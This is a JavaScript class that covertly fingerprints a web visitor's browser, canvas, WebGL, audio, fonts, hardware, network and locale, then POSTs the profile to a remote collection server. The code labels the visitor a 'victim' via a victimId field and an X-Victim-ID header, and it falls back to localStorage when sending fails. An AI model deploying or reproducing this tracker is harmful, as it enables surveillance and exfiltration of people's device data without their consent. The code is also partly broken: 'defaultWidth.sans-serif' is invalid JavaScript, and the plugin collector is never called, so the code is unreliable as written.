class AdvancedFingerprint {
    constructor(victimId, serverUrl) {
        this.victimId = victimId;
        this.serverUrl = serverUrl;
        this.fingerprintData = {};
    }

    async generateComprehensiveFingerprint() {
        try {
            // Basic browser fingerprint
            await this.collectBasicFingerprint();
            
            // Advanced canvas fingerprint
            await this.generateCanvasFingerprint();
            
            // WebGL fingerprint
            await this.generateWebGLFingerprint();
            
            // Audio fingerprint
            await this.generateAudioFingerprint();
            
            // Hardware fingerprint
            await this.collectHardwareInfo();
            
            // Network fingerprint
            await this.collectNetworkInfo();
            
            // Installed fonts
            await this.detectFonts();
            
            // Screen properties
            await this.collectScreenInfo();
            
            // Timezone and locale
            await this.collectLocaleInfo();
            
            // Send complete fingerprint
            await this.sendFingerprintData();
            
            return this.fingerprintData;
            
        } catch (error) {
            console.error('Fingerprint generation error:', error);
            await this.sendError('fingerprint_error', error);
            return null;
        }
    }

    collectBasicFingerprint() {
        this.fingerprintData.basic = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            doNotTrack: navigator.doNotTrack,
            maxTouchPoints: navigator.maxTouchPoints,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            webdriver: navigator.webdriver
        };
    }

    generateCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = 200;
            canvas.height = 50;
            
            // Text with gradient
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Security Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Security Fingerprint', 4, 17);
            
            // Add complexity
            ctx.globalCompositeOperation = 'multiply';
            ctx.fillStyle = 'rgb(255,0,255)';
            ctx.beginPath();
            ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.fillStyle = 'rgb(0,255,255)';
            ctx.beginPath();
            ctx.arc(100, 50, 50, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.fillStyle = 'rgb(255,255,0)';
            ctx.beginPath();
            ctx.arc(75, 100, 50, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.fillStyle = 'rgb(255,0,255)';
            ctx.arc(75, 75, 75, 0, Math.PI * 2, true);
            ctx.arc(75, 75, 25, 0, Math.PI * 2, true);
            ctx.fill('evenodd');

            this.fingerprintData.canvas = {
                dataURL: canvas.toDataURL(),
                winding: ctx.isPointInPath(50, 50),
                text: ctx.measureText('Security Fingerprint').width,
                gradient: ctx.createLinearGradient(0, 0, 200, 0) ? true : false
            };

        } catch (error) {
            this.fingerprintData.canvas = { error: error.message };
        }
    }

    generateWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) {
                this.fingerprintData.webgl = { supported: false };
                return;
            }

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const vendor = gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR);
            const renderer = gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER);

            // Get WebGL parameters
            const parameters = {
                VERSION: gl.getParameter(gl.VERSION),
                SHADING_LANGUAGE_VERSION: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                VENDOR: vendor,
                RENDERER: renderer,
                MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                MAX_CUBE_MAP_TEXTURE_SIZE: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
                MAX_RENDERBUFFER_SIZE: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
                MAX_VIEWPORT_DIMS: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                MAX_VERTEX_UNIFORM_VECTORS: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
                MAX_VARYING_VECTORS: gl.getParameter(gl.MAX_VARYING_VECTORS),
                MAX_VERTEX_ATTRIBS: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                ALIASED_POINT_SIZE_RANGE: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE)
            };

            // Create WebGL program for additional fingerprinting
            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vertexShader, 'attribute vec2 attr; void main() { gl_Position = vec4(attr, 0, 1); }');
            gl.compileShader(vertexShader);

            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fragmentShader, 'void main() { gl_FragColor = vec4(0, 0, 0, 1); }');
            gl.compileShader(fragmentShader);

            const program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);

            this.fingerprintData.webgl = {
                supported: true,
                parameters: parameters,
                programLinked: gl.getProgramParameter(program, gl.LINK_STATUS),
                shaderCompiled: gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS),
                extensions: gl.getSupportedExtensions()
            };

        } catch (error) {
            this.fingerprintData.webgl = { error: error.message };
        }
    }

    generateAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const compressor = audioContext.createDynamicsCompressor();
            const gain = audioContext.createGain();

            oscillator.connect(compressor);
            compressor.connect(gain);
            gain.connect(audioContext.destination);

            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);

            // Analyze the audio output
            const analyser = audioContext.createAnalyser();
            gain.connect(analyser);

            oscillator.start();
            oscillator.stop(audioContext.currentTime + 0.1);

            const dataArray = new Float32Array(analyser.frequencyBinCount);
            analyser.getFloatFrequencyData(dataArray);

            this.fingerprintData.audio = {
                sampleRate: audioContext.sampleRate,
                channelCount: audioContext.destination.channelCount,
                frequencyData: Array.from(dataArray).slice(0, 10), // First 10 values
                hasAudioContext: !!audioContext,
                hasOscillator: !!oscillator
            };

            audioContext.close();

        } catch (error) {
            this.fingerprintData.audio = { error: error.message };
        }
    }

    collectHardwareInfo() {
        this.fingerprintData.hardware = {
            concurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            devicePixelRatio: window.devicePixelRatio,
            touchSupport: 'ontouchstart' in window
        };
    }

    collectNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        
        this.fingerprintData.network = connection ? {
            effectiveType: connection.effectiveType,
            downlink: connection.downlink,
            rtt: connection.rtt,
            saveData: connection.saveData,
            type: connection.type
        } : { supported: false };
    }

    async detectFonts() {
        const baseFonts = [
            'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
            'Bookman Old Style', 'Bradley Hand ITC', 'Century', 'Century Gothic',
            'Comic Sans MS', 'Courier', 'Courier New', 'Georgia', 'Gentium',
            'Helvetica', 'Impact', 'King', 'Lucida Console', 'Lalit',
            'Modena', 'Monotype Corsiva', 'Papyrus', 'Tahoma', 'TeX',
            'Times', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Verona'
        ];

        const testString = "mmmmmmmmmmlli";
        const testSize = '72px';
        const span = document.createElement('span');
        
        span.style.fontSize = testSize;
        span.style.position = 'absolute';
        span.style.left = '-9999px';
        span.style.top = '-9999px';
        
        document.body.appendChild(span);

        const defaultWidth = {};
        const defaultHeight = {};

        // Get default dimensions
        span.style.fontFamily = 'monospace';
        defaultWidth.monospace = span.offsetWidth;
        defaultHeight.monospace = span.offsetHeight;

        span.style.fontFamily = 'sans-serif';
        defaultWidth.sans-serif = span.offsetWidth;
        defaultHeight.sans-serif = span.offsetHeight;

        span.style.fontFamily = 'serif';
        defaultWidth.serif = span.offsetWidth;
        defaultHeight.serif = span.offsetHeight;

        const detectedFonts = [];

        for (const font of baseFonts) {
            span.style.fontFamily = `'${font}', monospace`;
            const width = span.offsetWidth;
            const height = span.offsetHeight;

            if (width !== defaultWidth.monospace || height !== defaultHeight.monospace) {
                detectedFonts.push(font);
            }
        }

        document.body.removeChild(span);

        this.fingerprintData.fonts = {
            detected: detectedFonts,
            total: detectedFonts.length,
            baseFonts: baseFonts.length
        };
    }

    collectScreenInfo() {
        this.fingerprintData.screen = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown'
        };
    }

    collectLocaleInfo() {
        this.fingerprintData.locale = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            locale: navigator.language,
            languages: navigator.languages,
            systemLanguage: navigator.language || navigator.userLanguage,
            userLanguage: navigator.language || navigator.userLanguage,
            platformLanguage: navigator.language || navigator.systemLanguage
        };
    }

    collectPluginsAndMimeTypes() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push({
                name: navigator.plugins[i].name,
                filename: navigator.plugins[i].filename,
                description: navigator.plugins[i].description
            });
        }

        const mimeTypes = [];
        for (let i = 0; i < navigator.mimeTypes.length; i++) {
            mimeTypes.push({
                type: navigator.mimeTypes[i].type,
                description: navigator.mimeTypes[i].description,
                suffixes: navigator.mimeTypes[i].suffixes
            });
        }

        this.fingerprintData.plugins = {
            plugins: plugins,
            mimeTypes: mimeTypes,
            pluginCount: navigator.plugins.length,
            mimeTypeCount: navigator.mimeTypes.length
        };
    }

    async sendFingerprintData() {
        return this.sendToServer('fingerprint', this.fingerprintData);
    }

    async sendError(type, error) {
        return this.sendToServer('error', {
            type: type,
            message: error.message,
            stack: error.stack
        });
    }

    async sendToServer(type, data) {
        try {
            const response = await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: type,
                    payload: data,
                    timestamp: Date.now()
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            return await response.json();

        } catch (error) {
            console.warn('Failed to send fingerprint data:', error);
            this.storeLocally(type, data);
            return null;
        }
    }

    storeLocally(type, data) {
        try {
            const key = `fingerprint_${type}_${Date.now()}`;
            localStorage.setItem(key, JSON.stringify({
                type: type,
                data: data,
                timestamp: Date.now(),
                victimId: this.victimId
            }));
        } catch (error) {
            console.warn('Local storage failed:', error);
        }
    }

    // Generate a unique fingerprint hash
    generateFingerprintHash() {
        const dataString = JSON.stringify(this.fingerprintData);
        let hash = 0;
        
        for (let i = 0; i < dataString.length; i++) {
            const char = dataString.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32bit integer
        }
        
        return Math.abs(hash).toString(36);
    }
}

// Export for use in other modules
window.AdvancedFingerprint = AdvancedFingerprint;
